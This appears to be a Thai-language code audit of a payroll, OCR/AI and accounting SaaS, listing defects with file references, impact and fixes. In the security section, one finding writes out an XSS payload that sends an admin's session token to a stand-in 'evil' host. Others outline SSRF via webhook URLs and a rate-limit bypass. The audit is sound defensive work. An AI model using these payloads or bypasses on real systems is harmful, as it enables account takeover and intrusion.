| S7 | P1 | PayrollService.cs:2212-2219 (Cr 21816) · ไม่มี ExportKt20* | กองทุนเงินทดแทนคิด+ลง JE แต่ไม่มีรายงาน กท.20ก/endpoint/ปฏิทิน/ทางล้างหนี้ | หนี้สิน 21816 พอกตลอดไป งบดุลผิด | ExportKt20aAsync + ปฏิทิน + SettleWorkersCompensationAsync | M |
| W1 | P1 | PayrollService.cs:2972 `if (IsNullOrWhiteSpace(emp.TaxId)) continue;` · Employee.TaxId ไม่มีจุดเขียนทั้งเรพ | IssueMonthlyPnd1CertsAsync ข้ามทุกคนเสมอ — ทะเบียน cert ภ.ง.ด.1 ว่างตลอดกาล | เงื่อนไขที่เป็นจริงไม่ได้เลย | ใช้ `emp.CitizenId ?? emp.TaxId` (แบบ ExpenseClaimService:521) + เทสต์ | S |
| W2 | P1 | PayrollService.cs:3283-3376 BuildPayslipHtml + _thMonthsFull | 94 บรรทัด 0 call site (สลิปจริงใช้ QuestPDF) | renderer ตัวที่สองรอ drift | ลบ | S |
| W3 | P1 | PayrollService.cs:3690 vs TaxFilingExportService.cs:61 · :3725 vs :382-384 | จอ ภ.ง.ด.1 ใช้ GrossIncome ไฟล์ใช้ TaxableGross · จอ ปกส. ใช้ Min(BaseSalary,Max) ไฟล์ใช้ SsoWageBase.Resolve | ตรวจบนจอแล้วยื่นไฟล์คนละตัวเลข | จอเรียก ITaxFilingExportService ตัวเดียวกัน | M |
| W4 | P1 | PayrollService.cs:2539,2571 vs คอมเมนต์ :1857-1861 | 50 ทวิ รายปีใช้ GrossIncome แทน TaxableGross | สวัสดิการยกเว้นภาษีถูกประกาศเป็นเงินได้ ⇒ ภ.ง.ด.91 ไม่ตรง ภ.ง.ด.1ก | helper IncomeForTax ตัวเดียว | S |
| A1 | P1 | PayrollController.cs:206,214,242,246,250,309,145,196 | POST runs/import/calculate/approve/**pay**/**settle-sso**/employees/sync/items ไม่มี CheckPayrollAccessAsync (GET/void/reopen/update-detail มี) | สมาชิกคนไหนก็ได้สร้าง→อนุมัติ→จ่าย ลง JE เครดิตเงินสด · sync ฐานเงินเดือนทั้งบริษัท | ใส่ด่านทุก endpoint เขียน | S |
| A2 | P1 | PayrollController.cs:541-543 vs คอมเมนต์ :527-529 | GET sso/{y}/{m} ไม่มีด่าน ทั้งที่คืนชื่อ+เลขผู้ประกันตน+ค่าจ้างรายคนทั้งบริษัท | PDPA ม.26/37 · ด่านอ่อนกว่าแต่คืนข้อมูลเท่ากัน | CheckPayrollAccessAsync + PiiAccessLog | S |
| D1 | P1 | PayrollService.cs:1401 | UpdatePayrollDetailAsync เขียน `TaxableGross = GrossIncome` ทับเสมอ | แก้ยอดช่องเดียว ค่าแยกภาษี (สวัสดิการยกเว้น) หายถาวร | `decimal? TaxableGross` ใน request + รักษาสัดส่วนเดิม | S |
| D2 | P1 | PayrollService.cs:1394 + payroll.html:1452,1570 | โมดัลแก้ยอดกรอกโบนัส/OT ได้ แต่ไม่คำนวณ withholdingTax ใหม่ | HR ใส่โบนัส 200,000 ภาษียังยอดเดิม ⇒ นำส่งขาด | pure class ThaiPitCalculator (R2) + ปุ่มคำนวณใหม่ | M |
| U1 | P1 | payroll.html:170-230 · employees.html:413-417 (hardcode null/false/0) | ไม่มีหน้าไหนเก็บ: เลขผู้ประกันตน · สถานพยาบาล · PVD+% · ที่อยู่ · วันเกิด · เพศ · SalaryType | สปส.1-10 (:400)/6-09 (:604) ช่องว่าง · 50 ทวิ ที่อยู่ว่าง (:2624) · PVD เปิดไม่ได้จาก UI | เติมช่อง หรือยุบเหลือหน้าเดียว (R1) | M |
| U2 | P1 | ไม่มี (grep DirectCredit/โอนเงินเดือน=0) | ไม่มีไฟล์โอนเงินเดือนเข้าธนาคาร ทั้งที่เก็บ BankAccountNumber | HR คีย์มือทีละคนทุกเดือน | ExportPayrollTransferFileAsync (SCB/KTB + CSV) + ด่านตรวจเลขบัญชี | M |
| U3 | P2 | PayrollController.cs:362-374 | ดูสลิปต้อง PayrollView ⇒ พนักงานเปิดสลิปตัวเองไม่ได้ (มีแค่ LINE ที่ HR กดส่ง) | leave-my (layout.js:977) มี self-service แล้วแต่ไม่ครอบสลิป | GET /me/payslips + /me/wht-cert/{year} + my-payslips.html | M |
| X1 | P2 | PayrollService.cs:1393 | SocialSecurityEmployer ถูกเขียนหลังสาขา base ⇒ ทับค่าที่คำนวณ (JS ซิงก์ให้ก่อน แต่ API ตรงพัง) | คู่ค้าส่งทั้งคู่ได้คู่ขัดกัน | ย้ายเข้า else ของสาขา base | S |
| X2 | P2 | PayrollService.cs:1019 vs :966 | import ไม่ normalize/validate Year ⇒ 2569 → ExportPnd1 :55 พิมพ์ 3112 | | Helpers/ThaiDate normalize จุดเดียว | S |
| X3 | P2 | TaxFilingExportService.cs:387 vs :513 | สปส.1-10 txt รวมค่าจ้าง cap แต่ xlsx ไม่ cap | สองไฟล์แบบเดียวกันตัวเลขต่างกัน | ตัดสินครั้งเดียว | S |
| X4 | P2 | TaxFilingExportService.cs:357,438 | กรอง `SocialSecurityEmployee > 0` ⇒ แถว conflict (ลูกจ้าง 0/นายจ้างมี) หายจากไฟล์ | นำส่งขาดเงียบ | `emp>0 \|\| er>0` + บล็อก export พร้อมรายชื่อ | S |
| X5 | P2 | TaxFilingExportService.cs:210 vs คอมเมนต์ :202-204 | ภ.ง.ด.1ก คอมเมนต์ 14 คอลัมน์ โค้ด 16 | ยื่นแล้วอาจถูกตีกลับ | เทียบ template RD จริง + เทสต์ล็อกจำนวนช่อง | S (สงสัย) |
| Z1 | P3 | Payroll.cs | PayFrequency/MaritalStatus/NickName/ProbationEndDate/SalaryExpenseAccountId/AbsentDays/BreakdownJson/Remarks/OvertimeHours(ไม่เคยถูกเขียน)/SsoSettlementDocumentId 0 ref | | ลบ/ต่อสาย | S |
| Z2 | P3 | api.js:576, 638 `payPayroll` ซ้ำ · tools/js_dup_method_check.py:150-172 | key ซ้ำจริงแต่ checker รายงาน 0 (เก็บ key เฉพาะ depth==1 จาก `name = {`, ไม่จับ `return {`) | checker ที่มองไม่เห็นของจริง | ขยาย checker + negative test กับ api.js | S |

## เส้นทางรอบเงินเดือนตอนนี้ ≈ 15 ขั้น 4 หน้า + 3 ขั้นนอกระบบ (โอนเงิน/ยื่น ภ.ง.ด.1/e-Filing) · สร้างรอบพัง (F1) · ตั้งค่า ปกส./กฎภาษีซ่อนใต้แท็บ "รายงาน" · แก้ยอด 100 คน = 100 โมดัล · ไม่มี JE preview
## ที่เสนอ: หน้าเดียว 4 ขั้น — เริ่มรอบ(สร้าง+คำนวณ) → ตารางตรวจ inline-edit + แถบเตือนรวม → อนุมัติ+จ่าย (JE preview) → ศูนย์เอกสารของรอบ (ไฟล์โอน/ภ.ง.ด.1/สปส.1-10/สลิป/นำส่ง) · พนักงานเปิดสลิปเอง

## ของที่ไม่มีใครเรียก: Section42TwiCap · HealthInsuranceCap/MortgageInterestCap (:544,551 ไม่มีฟิลด์ฝั่ง Employee) · ลดหย่อน 8 ฟิลด์ · Employee.TaxId · BuildPayslipHtml · กท.20ก · ไฟล์โอนธนาคาร · Z1 · ไม่มี pure class PIT
## Re-design: R1 ยุบพนักงานเหลือ employees.html ฟอร์ม 4 แท็บ (ทะเบียน·ค่าจ้าง/ธนาคาร·ปกส./PVD·ลดหย่อน) · R2 Helpers/ThaiPitCalculator pure + เทสต์ (เงื่อนไขก่อนแก้ T1-T4 — เมธอด 470 บรรทัดไม่มีเทสต์) · R3 PayableDays/PeriodDays เป็นตัวตั้ง · R4 FilingDeadline resolver เดียว (3 ที่ไม่ตรงกัน + doc บอก 22) · R5 SettlePayrollLiabilityAsync(runId, kind) generic — ภ.ง.ด.1 (21914) และ กท. (21816) ไม่มีทางล้างหนี้
## ยังไม่ได้อ่าน: PdfGenerationService.Payslip/WhtCert layout · PayslipLineDeliveryService + PayslipPublicController (ลิงก์สาธารณะ — ควรตรวจก่อน) · SalaryAdvance/ExpenseClaim/HrAllocation/TipPayout · leave*.html vs service · EmailScheduleService.OnPayrollPaid · ยังไม่ verify กฎหมาย: เพดาน 17,500 (S4) · e-Filing ปกส. (S5) · layout ภ.ง.ด.1ก (X5)


# ทีม E — OCR/AI (verified by main: OCR-01, AI-01, AI-02, AI-03, AI-06 ✔)

## ตัวเลข parity (AiFeatureKey 57 ค่า)
- มี student 17/57 · เรียก AskAsync จริง 20/57 · มี UsedAi ใน DTO 11/57
- enum ตายสนิท 8 ค่า (ไม่มี producer): DocumentRoleInference · LineItemStructuredParse · ProductMatch · ContactMatch · PaymentMethodSuggestion · CurrencyAndFxSuggestion · TaxFilingPreCheck · ManualJournalSuggestion — ยังอยู่ในลิสต์ที่ AiFeedbackTrainingJob.cs:232-255 mine ทุก 6 ชม.
- ~25 endpoint ใน AiSuggestionController เป็น heuristic ล้วน (ไม่เคยเรียก AskAsync) แต่บันทึก Status=Success, ProviderUsed=DeepSeek
- 🔴 ละเมิดกฎเหล็ก #1: FuzzyDuplicateDetection (ไม่มีจุดปิด loop, endpoint check-duplicate ไม่มีใครเรียก) · ForecastNarrative (ไม่มี student) · AgingExplanation (ไม่มี student แต่มี local fallback ดี) · OcrFullReview/DocumentConversionSuggestion (AI-01) · VatTypeInference (OCR-01) · PayrollIncomeTypeSuggestion (ไม่บันทึก feedback เลย)
- ✅ ครบจริง: GlAccountSuggestion · BankStatementMatch · CreditNoteReasonClassification · PaymentVoucherAccountingSuggestion · PublicFaqChat · TenantAssistantChat

## Kill-switch (ปิด provider ทุกตัว)
- ✅ AiOrchestrator ไม่โยน (outer try/catch + FallbackToLocal ทุกทาง :112-121,546-562) · DeepSeekProvider คืน Success=false · ScanAsync ทำงานครบ (Tier 0-3 ไม่พึ่ง AI) · GL/line-split เสื่อมสง่า · budget/timeout เงียบ · cold start มี seeder
- 🔴 ReviewOcrAsync (ปุ่ม "🤖 ขอ AI ตรวจอีกครั้ง") · SuggestDocumentConversionAsync · SuggestStockDecisionsAsync พังทั้ง 3 เพราะ AI-01
- ✅ AnalyzeArApAsync ประกอบ StructuredJson จาก local เอง (AdvancedAiAugmenter.cs:577-609) = แม่แบบที่ถูก

| ID | ระดับ | file:line | อาการ | ผลกระทบ | แก้ | ขนาด |
|---|---|---|---|---|---|---|
| OCR-01 | P0 | OcrService.cs:5095, 5128, 5314, 5329 · pro-rate 4990-4994 · OcrExtractedLineItem 7261-7282 ไม่มี VatRate | ทุกบรรทัดจาก OCR ได้ `VatRate = headerVat > 0 ? 7 : 0` + VAT หัวถูกเฉลี่ยตามสัดส่วนยอดลงทุกบรรทัด | ใบผสม 7%/ยกเว้น (Makro/BigC/บิลอาหาร = งานประจำวัน) บรรทัดยกเว้นติดป้าย 7% ⇒ รายงานภาษีซื้อแยกคอลัมน์ §87 ผิดทุกใบ ยอดรวมตรงจึงเงียบ | เพิ่ม VatRate ใน OcrExtractedLineItem → ExtractedItemsJson (:725) → DTO → review · เรียก VatTypeInference ต่อบรรทัดใน ScanAsync · เฉลี่ย VAT เฉพาะ rate>0 · ด่าน Σline VAT == header | L |
| AI-01 | P1 | AdvancedAiAugmenter.cs:749-759 `StructuredJson: resp.RawResponseJson` · AiOrchestrator.cs:561 (FallbackToLocal RawResponseJson=null) · :89-103 ReturnLocalAsync · OcrFullReviewDistillationModel.cs:164-186 · document-scan.html:2866-2868 | local path ไม่เคยเซ็ต RawResponseJson ⇒ student ที่เขียนมาเพื่อ kill-switch ถูกทิ้ง ผู้ใช้เห็น toast "🤖 AI ตรวจสอบเสร็จ" + แผงว่าง | silent no-op 3 feature (OcrFullReview · DocumentConversion · StockDecisions) | `StructuredJson: resp.RawResponseJson ?? (IsJsonObject(resp.PrimaryAnswer) ? resp.PrimaryAnswer : null)` · JS: `!usedAi && !structured` → toast "AI ไม่พร้อม ใช้ค่าเดิม" | S |
| AI-02 | P1 | AiBudgetGuard.cs:79-85 | billableStatuses นับทุกแถว Success รวม ~25 endpoint heuristic ที่ไม่เคยยิง provider (AiSuggestionController.cs:553 ฯลฯ) — คอมเมนต์เหนือโค้ดบอกเองว่าห้าม | วันที่ผู้ใช้กดปุ่มแนะนำ (ฟรี) เยอะ daily cap เต็ม → บล็อก AI จริงทั้ง tenant | เพิ่ม `AiCallStatus.LocalServed` หรือกรอง `ProviderUsed != None && ModelVersion != "heuristic"/"memory"` | S |
| AI-03 | P1 | AiSuggestionController.cs:98-105 RecordLearnedAsync | memory hit บันทึก `Status: Success, ProviderUsed: DeepSeek, ModelVersion: "memory"` | AiUsageReportService.cs:204/444 นับเป็น "สำเร็จ (เรียก AI)" · LocalModelHealth AiAccuracy30d เพี้ยน · ตัวชี้วัด "UsedAi ลดลง" (กฎเหล็ก #1 ข้อ 6) อ่านไม่ได้ | ProviderUsed=None + LocalServed · กรองใน AiUsageReportService + RefreshAllLocalModelHealthsAsync — ทำพร้อม AI-02 ในคอมมิตเดียว | S |
| AI-06 | P1 | AiPromptSanitizer.cs:37-45, 82-97, 116-129 · AdvancedPrompts.cs:128 · WorkflowPrompts.cs:324 | (ก) ไม่มี regex อีเมลทั้งที่ doc :28,:53 บอกว่าปิดเสมอ (ข) กติกา `_pii`/`_personal` ไม่มี prompt builder ใช้เลย (grep Prompts/ = 0) ⇒ ชื่อ+ที่อยู่ส่งดิบ (ค) เลขบัญชี 10 หลักไม่ขึ้นต้น 0 ไม่เข้า regex (ง) `AllowTaxIdInPrompt=true` บน OcrReviewPrompt ส่ง raw text ทั้งใบ | ผู้ขายบุคคลธรรมดาใช้เลขบัตร ปชช. เป็นเลขภาษี = §26 ถูกส่งไป DeepSeek ดิบ · control ที่เขียนไว้แต่ไม่มีใครเรียก | Email+BankAccount regex · builder ตั้งชื่อ `_pii` จริง (หรือ allow-list) · AllowTaxIdInPrompt แยกนิติบุคคล (ขึ้นต้น 0) จากบัตร ปชช. | M |
| AI-04 | P2 | AiSuggestionController.cs:26 (doc อ้างว่าทุก endpoint คืน usedAi — จริง 8 ตัว) · js/ai-suggestion.js:82-84 | popover hardcode "🤖 AI แนะนำ" และเมื่อ usedAi falsy ขึ้น "AI ไม่พร้อม — ใช้ local pick" | heuristic ที่ถูก 100% ถูกป้ายว่า "AI ไม่พร้อม" + "AI แนะนำ" พร้อมกัน ผิดสองทาง | ทุก endpoint คืน usedAi · popover `usedAi ? '🤖 AI แนะนำ' : '⚙️ ระบบแนะนำ'` | M |
| AI-05 | P2 | OcrService.cs:865 TargetDocTypeUsedAi · :1884 AiSuggestedContactId vs MapToResponse :6589-6638 | สองธงเขียนลง entity แต่ไม่อยู่ใน OcrResultResponse | ผู้ใช้แยกไม่ออกว่าค่ามาจาก rule/VendorIntel/federated (ความรู้ข้าม tenant :1172)/AI | เพิ่ม 2 ฟิลด์ + ป้าย 🤖/🌐/⚙️ | S |
| OCR-02 | P2 | AiSuggestionController.cs:473 vs OcrService.ScanAsync | `/ai/vat/infer-type` ถูกเรียกจาก documents.html:3627 (กรอกมือ) แต่สาย OCR ไม่เคยเรียก | เอกสารกรอกมือได้ VAT type รายบรรทัด แต่ OCR (90% ตามเจตนากฎ #3) ไม่ได้ — ต้นเหตุ OCR-01 | เรียกใน ScanAsync หลัง ApplyProductCrossReferenceAsync | M |
| OCR-03 | P2 | OcrService.cs:6633, 6635 `?? "00000"` · FieldConfidence เขียนเฉพาะตอนเจอ :6921,6927 · document-scan.html:1949-1951 | สาขาที่อ่านไม่ได้ถูกเติม 00000 โดยไม่มี key ใน FieldConfidence ⇒ fc() ตกไปโชว์ doc confidence (เช่น 95%) | ผู้ใช้เห็น "00000 · 95%" กดยืนยัน ⇒ ใบสาขา 3 ลงเป็นสำนักงานใหญ่ §86/4 + §87 | fallback → FieldConfidence[SellerBranchCode]=0.30 · fc() ไม่ fallback ไป doc confidence แสดง "—" | S |
| OCR-04 | P2 | document-scan.html:1940-1951 vs documents.html:2701-2739 | review modal มีแค่ badge % ไม่มีไฮไลต์เหลือง/tooltip · ไฮไลต์จริงอยู่ในฟอร์มเอกสาร (หน้าถัดไป) และ map แค่ 7 ช่อง ไม่มี SellerBranchCode/BuyerTaxId/BuyerBranchCode/address | หน้าที่ตัดสินใจจริงไม่มีสัญญาณ (กฎ #3 ข้อ 3) | ยก `_applyOcrConfidenceHints` เป็น helper กลางใน layout.js + map ครบตาม OcrFieldKeys.CriticalForTaxInvoice | S |
| OCR-05 | P2 | OcrDtos.cs:167-197 OcrCorrectionRequest · document-scan.html:2943-2971 · :2183 | ไม่มี VendorAddress/BuyerAddress/BuyerName/PaymentTermsDays ทั้ง DTO และฟอร์ม | OCR อ่านที่อยู่ผิดแก้จากหน้า review ไม่ได้ ต้องแก้ Contact (เปลี่ยนใบเก่าทั้งหมด) | เพิ่ม 4 ช่องตามเช็กลิสต์ B | S |
| OCR-06 | P2 | pages/review-queue.html · OcrController.cs:1003 | คิว review จัด priority+quality grade ทำงานครบ แต่ไม่มีเมนู/ลิงก์ชี้ไปเลย | นักบัญชี 200 ใบค้างต้องไล่การ์ดเอง | เพิ่ม nav item (layout.js:1002) หรือแท็บใน document-scan | S |
| AI-07 | P2 | Jobs/AiFeedbackTrainingJob.cs:34-49 | ไม่มี pg_advisory_lock (ต่างจาก job อื่น 7 ไฟล์) | หลาย instance เทรนพร้อมกัน เขียน LocalModelHealth/Memories ทับกัน | ห่อ RunOnceAsync ด้วย AdvisoryLockKey.For(Guid.Empty,"ai-feedback-training","global") | S |
| AI-08 | P3 | AiBudgetGuard.cs:38-41 static cache | cap ต่อ process (3 node = 3× cap) แต่ cost ยัง query DB | | ย้ายไป DB-upsert แบบ ChatRateLimiter | S |
| AI-09 | P3 | AiOrchestrator.cs:119 | outer catch ใช้ request ก่อน with{LocalPrimaryAnswer} :142 ⇒ exception หลังทำนาย student ทำคำตอบ student หาย | | เก็บ localPred นอก try | S |
| AI-10 | P3 | AllEnums.cs:1384-1400,1355,1363,1413 + AiFeedbackTrainingJob.cs:232-255 | 8 enum ตายยังถูก mine | | ProductMatch/ContactMatch ต่อสายเข้า ContactFuzzyMatch · ที่เหลือ [Obsolete]+ถอดจาก mine | S |
| OCR-07 | P3 | document-scan.html:447-471 | ปุ่ม "⚡ ยืนยัน + ลงบัญชี" ไม่มี Enter binding (กฎ #3 ข้อ 4) | bulk 50 ใบต้องเลื่อนเมาส์ทุกใบ | keydown Enter นอก textarea → createDocFromReview(true) | S |

## ของที่มีแต่ไม่มีใครเรียก
review-queue.html + GET /ocr/review-queue · AiFeatureKey 8 ค่า · POST /ai/documents/check-duplicate (:3275) · /ai/dimension-allocation/suggest (:1170) · /ai/bank/{id}/comprehensive-match (:3109) · /ai/import/suggest-mapping (:1763 ซ้ำ ImportExportService:1795) · /ai/anomaly/explain (:3239 ซ้ำ /anomalies/{id}/explain) · /ai/payroll/suggest-income-type (:1335 ไม่บันทึก feedback) · กติกา _pii/_personal · คำตอบ OcrFullReviewDistillationModel

## Re-design
1. ToResult ต้องมี local-composition path (แม่แบบ AnalyzeArApAsync :577-609) — feature ที่ output เป็น JSON ห้ามพึ่ง RawResponseJson ทางเดียว
2. เพิ่ม AiCallStatus.LocalServed แล้วแก้ผู้บริโภค 3 จุดพร้อมกัน (AiBudgetGuard:79 · AiUsageReportService:204 · AiFeedbackTrainingJob:83-92)
3. VatRate เป็นพลเมืองชั้นหนึ่งของ pipeline OCR (entity → JSON → DTO → review แก้ได้)
4. enum มีมิติ IsProviderBacked · AiFeatureRoutingResolver ไม่แสดง feature ที่ไม่มีทาง AI ในหน้าแอดมิน (ตอนนี้ตั้ง Hybrid ให้ VatTypeInference ได้ = สวิตช์หลอก)
5. resolver เดียว `Layout.ocrFieldHint(field, conf, source)` ให้ review modal + ฟอร์มใช้ร่วม

## ยังไม่ได้อ่านละเอียด: SmartFieldExtractor/DocumentZoneAnalyzer/FieldPatternLibrary เต็มไฟล์ · EmbeddedTesseractOcrService · AzureDiPatternLearner · ocr-service/ (python) · admin/ai-config.html · endpoint heuristic 19 ตัวที่เหลือ (สุ่ม 6 พบรูปแบบเดียวกัน — แถว 40-52 เป็น "สงสัยมั่นใจสูง")


# ทีม F — Security / Architecture / Performance (verified by main: F-01, F-02 ✔)

## Controller gate สรุป (143 คลาสจาก 137 ไฟล์)
- `[Authorize]` ระดับคลาส 118 · `[Authorize(Roles=SystemAdmin)]` 7 · `[AllowAnonymous]` ระดับคลาส 8 · **ไม่มี attribute ระดับคลาส 10** (AuthController, CmsLeadController, ContactInquiryController, DeepLinkController, InvitationController, PortalPublicController, PublicQuotationController, VendorPortalController +2)
- `RequirePermission` ใช้แค่ **3 คลาส + 12 เมธอด จาก ~1,300 endpoint** — endpoint ที่แตะเงิน (Bank 33 · Pos 50 · Document 66 · Payroll 50) ยัง "สมาชิกคนไหนก็ทำได้"
- `TenantGuardFilter` + `TenantAccessMiddleware` ครอบทุก route ที่มี `{companyId}` = IDOR คลาสหลักปิดแล้ว · ช่องที่เหลือ = endpoint ที่ **ไม่มี companyId ใน route** ซึ่ง guard ข้ามเงียบ (F-02)
- คลาสเสี่ยง: **SubscriptionController (วิกฤต F-02)** · AuthController/CmsContentController/WebhookController (สูง) · AdminController (อัปโหลดราก /uploads) · RolePermissionController (แก้สิทธิ์ไม่มี Owner gate) · AuditTrail/Bank/Pos/ImportExport/EmailConfig/HrAllocation/OwnerConfig/Sensitivity (กลาง — ไม่มี perm gate) · PayslipPublicController (token ไม่อยู่ใน tier auth rate limit → เดา 600/นาที/IP) · MobileController devices/{token} ไม่มี owner check

| ID | ระดับ | file:line | อาการ | ผลกระทบ | แก้ | ขนาด |
|---|---|---|---|---|---|---|
| F-01 | P0 | admin/users.html:133-134,137,249 · admin/customers.html:111-112,189,382-383,642 · admin/payments.html:255,259 · admin/index.html:161-162 · InputSanitizationMiddleware.cs:44-72 (ไม่แตะ JSON body) · SecurityMiddleware.cs:81-85 (`unsafe-inline` ที่รู้ตัว) · AuthDtos.cs:14 FullName ไม่ validate | admin console ต่อ fullName/email/name/notes/ownerName เข้า innerHTML ดิบ (บางจุดใน `onclick='${u.email}'`) · สมัครสาธารณะเก็บ payload ดิบ | ใครก็ได้สมัครชื่อ `<img src=x onerror=fetch('//evil/?t='+localStorage.token)>` แล้วรอ SystemAdmin เปิดหน้า Users ⇒ ยึดแพลตฟอร์ม · หมายเหตุสลิปเป็นอีกทางเข้า | `esc()` ใน admin-layout.js ห่อทุก interpolation จาก DB · onclick → data-* + addEventListener · max-length+strip tag ที่ RegisterRequest.FullName/Company.Name · ระยะยาวถอด unsafe-inline | L |
| F-02 | P0 | SubscriptionController.cs:164 POST payments/{paymentId}/slip · :216 GET payments/{paymentId} (route `api/[controller]` ไม่มี companyId) · SubscriptionService.cs:1545-1563, 1582-1590 `FindAsync(paymentId)` ไม่มี tenant | TenantGuardFilter/TenantAccessMiddleware ข้ามเมื่อ route ไม่มี companyId · service ไม่กรอง | ผู้ใช้บริษัทใดอ่านรายการชำระค่าบริการบริษัทอื่น (ยอด/เลขโอน/ชื่อผู้ชำระ/ไฟล์สลิป) และ**เขียนทับสลิป** Pending ได้ | ย้ายใต้ `{companyId:guid}` (มี receipt endpoint เป็นแบบ) หรือ resolve `payment.Subscription.CompanyId` + ITenantGuard · **กลับด้าน guard**: `[NonTenantScoped]` explicit ไม่งั้นปฏิเสธ + checker | M |
| F-03 | P1 | CmsContentService.cs:522-534 · ImageProcessingService.cs:53-66,185-190 · Program.cs:797-807 · AdminController.cs:1877-1915 (เขียนราก /uploads) · ProductService.cs:30 (SVG) | UploadMedia: content-type ไม่รู้จัก → เขียนไฟล์ดิบด้วยนามสกุลจาก client ลง `uploads/cms/{companyId}/{siteId}/` ซึ่งอยู่ใน publicUploadPrefixes | สมาชิก tenant อัปโหลด `x.html/x.svg/x.js` ได้ URL origin เดียวกับแอป ⇒ stored XSS ผ่าน CSP `script-src 'self'` สมบูรณ์ | allow-list จาก magic bytes · ปฏิเสธที่ไม่ใช่รูป/PDF · SVG sanitize หรือแปลง PNG · `Content-Disposition: attachment` + `nosniff` บน /uploads/** · ระยะยาว origin แยก | M |
| F-04 | P1 | WebhookService.cs:40,73,316-346 · WebhookController.cs:55-57 | registration.Url ไม่ตรวจ scheme/host/private IP/redirect · HeadersJson ตั้งอะไรก็ได้ · คืน status+duration+error ให้ผู้เช่าอ่าน | ชี้ไป 169.254.169.254 / localhost:5432 / VPC แล้วใช้ status+เวลาเป็น oracle · POST เข้า endpoint ภายในไม่มี auth | บังคับ https · ปฏิเสธ private/loopback/link-local/metadata (resolve DNS ตอนส่งจริงกัน rebinding) · ปิด auto-redirect · จำกัด header · egress allow-list | M |
| F-05 | P1 | ApiKeyMiddleware.cs:113-117 | เขียน ApiKeyCanRead/CanWrite/CanDelete/Features ลง HttpContext.Items — grep ทั้งเรพไม่มีใครอ่าน (CanWrite default false) | key "อ่านอย่างเดียว" เขียน/ลบได้เต็ม — control ที่ไม่มีใครเรียก | IAsyncAuthorizationFilter global ใน Program.cs:611-616: 403 เมื่อ !CanWrite บน POST/PUT/PATCH, !CanDelete บน DELETE + เทสต์ | S |
| F-06 | P1 | Program.cs:174-178 `PersistKeysToFileSystem("./.dpkeys")` · PiiProtector.cs:44-75 TryDecrypt คืน null เงียบ | key ring บนดิสก์ต่อ instance ไม่มี shared store/KMS | หลาย replica: PII ที่ A เข้ารหัส B ถอดไม่ออก ⇒ เลขบัตร/ลายเซ็น = null สลับตามเครื่อง · restart ไม่มี volume = ข้อมูลหายถาวร (PDPA ม.26 + ม.10 เก็บ 5 ปี) | PersistKeysToDbContext/blob/shared volume + ProtectKeysWith · startup check · round-trip test | M |
| F-07 | P1 | Program.cs:1693-1735 · DatabaseMigrationHelper.cs:12-38 · ไม่มี CONCURRENTLY ใน 5,951 บรรทัด | ทุก boot รัน ~1,660 DDL ทีละคำสั่ง + catch กลืน "already exists" · GenerateCreateScript Split(';') · ไม่มี advisory lock | boot ช้า · CREATE INDEX ล็อกตารางใหญ่ระหว่าง deploy · rolling deploy ยิง DDL ชนกัน → schema ลงครึ่ง ๆ ไม่มีใครรู้ | pg_advisory_lock คีย์คงที่ · CONCURRENTLY นอก transaction · schema version ข้ามคำสั่งที่ apply แล้ว · lock_timeout · แยกเป็น job ก่อน deploy | L |
| F-08 | P1 | WhtCreditService.cs:436-445 · IntegrationService.cs:79,102 · PosService.Orders.cs:21-30,495-500,822-830 · WithholdingTaxCertService.cs:126,495 · DocumentService.cs:10305,10628 · ImportExportService.cs:1229 · ExpenseClaimService.cs:61 · LoanService.cs:25 · WarehouseService.cs:172 · AdvancedArApService.cs:242 · PortalService.cs:580 (~25 จุด) | `Max()+1` ไม่มี pg_advisory_xact_lock (มีแค่ 6 จุดที่ใช้ AdvisoryLockKey.For) · ไม่มี unique index บน JournalEntries/Payments/PosOrders/WithholdingTaxCerts (CompanyId, Number) | สอง instance/request ออกเลข JE/ใบเสร็จ/POS/50ทวิ ซ้ำ — โผล่เฉพาะตอน scale | `SequenceGenerator.NextAsync(companyId, scope, prefix)` ตัวเดียว (ลอก DocumentNumberGenerator:75-89) + unique index ทุกคู่ (ด่านเชิงโครงสร้างแบบ UX_JournalEntries_MonthlyJobRef) | L |
| F-09 | P1 | Services/Background/*.cs 11/12 ไฟล์ | มีแค่ UndueInputVatExpiryJob:64 ที่ล็อก · EclAllowanceJob กันด้วย unique index (ok) · ที่เหลือ (Depreciation, RecurringLateFee, OverdueDunning, AccountPlanExpiry, BankUnmatchedDigest, EmailScheduleWorker, ChatRetention, PdpaRetention, AuditChainVerify, DocumentAging, ScheduledReport) ไม่มีล็อก/watermark พึ่ง flag read-modify-write | ลง JE ค่าเสื่อม/ค่าปรับซ้ำ · อีเมลทวงหนี้ซ้ำ · purge PDPA ซ้ำ | ครอบ RunCycleAsync ด้วย `pg_advisory_xact_lock(AdvisoryLockKey.For(Guid.Empty,"job",<name>))` + watermark ต่อบริษัท (IJobRunRecorder มีแล้ว) | M |
| F-10 | P2 | RateLimitMiddleware.cs:11,47-49,62-77 · Program.cs:752 vs 878 | static ConcurrentDictionary ไม่ลบ key · isAuthenticated ตัดสินจาก "มี header Authorization" และ middleware รันก่อน UseAuthentication ⇒ ส่ง `Authorization: x` ได้ 3000/นาที แทน 600 | เพดาน ×N instance · ผู้ไม่ล็อกอินยกระดับ 5× · memory leak | ตัวนับ DB-upsert (ChatRateLimiter pattern) หรือ Redis · ตัดสิน tier หลัง UseAuthentication · eviction | M |
| F-11 | P2 | ApiKeyMiddleware.cs:57-58,92-93,141,246-268 | BCrypt.Verify + SaveChangesAsync(LastUsedAt) ทุก request · Verify วนทุก candidate · `.GetAwaiter().GetResult()` ใน lock | partner ยิงถี่ = CPU เต็ม + write load + thread-pool starvation ทั้งเซิร์ฟเวอร์ | แคช verify (SHA-256 ค้น) · throttle LastUsedAt 1/นาที/คีย์ · async 429 | M |
| F-12 | P2 | Pdf/PuppeteerHtmlPdfRenderer.cs:70-96,108-110 (ปิด default `Pdf:UseHtmlRenderer=false`) | Chromium `--no-sandbox` · SetContent Networkidle0 ไม่มี request interception · ไม่จำกัด concurrency | HtmlEncode พลาดจุดเดียว → `<img src="http://169.254…">` = SSRF · ไม่มี sandbox = RCE surface · PDF พร้อมกัน = memory | sandbox (รัน non-root) · SetRequestInterception abort ทุก request ที่ไม่ใช่ data: · SemaphoreSlim | M |
| F-13 | P2 | SignatureApprovalService.cs:211-220 | ApproveAsync ค้น UserSignature ด้วย SignatureId อย่างเดียว ไม่เช็ค UserId/tenant | แนบภาพลายเซ็นคนอื่น (ข้ามบริษัทถ้าเดา GUID) ลงเอกสารที่ส่งลูกค้า = ปลอมลายเซ็น + PDPA ม.26 | `&& s.UserId == userId` + ไล่จุดอื่นที่ resolve ลายเซ็นด้วย id | S |
